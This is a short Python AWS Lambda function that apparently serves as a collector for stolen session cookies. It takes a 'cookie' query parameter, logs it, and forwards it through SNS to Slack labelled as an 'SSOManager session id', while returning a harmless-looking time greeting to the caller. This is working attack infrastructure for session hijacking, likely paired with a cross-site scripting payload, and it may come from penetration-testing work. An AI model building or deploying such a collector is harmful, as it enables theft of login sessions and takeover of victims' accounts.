import json
import datetime

import logging
import boto3

logger = logging.getLogger()
logger.setLevel(logging.INFO)
sns = boto3.client('sns')
SLACK_ALERTS_SNS_ARN = 'arn:aws:sns:eu-west-2:306969940058:sns_slack_alerts'

def endpoint(event, context):
    logger.info(event)
    cookie = event['queryStringParameters']['cookie']
    logger.info("Cookie: " + cookie)
    current_time = datetime.datetime.now().time()
    
    slack_message = "*SSOManager session id* ```" + cookie + "```"
    
    sns.publish(
        TopicArn=SLACK_ALERTS_SNS_ARN,    
        Message=slack_message,    
    )
    
    body = {
        "message": "Hello, the current time is " + str(current_time)
    }

    response = {
        "statusCode": 200,
        "body": json.dumps(body)
    }

    return response
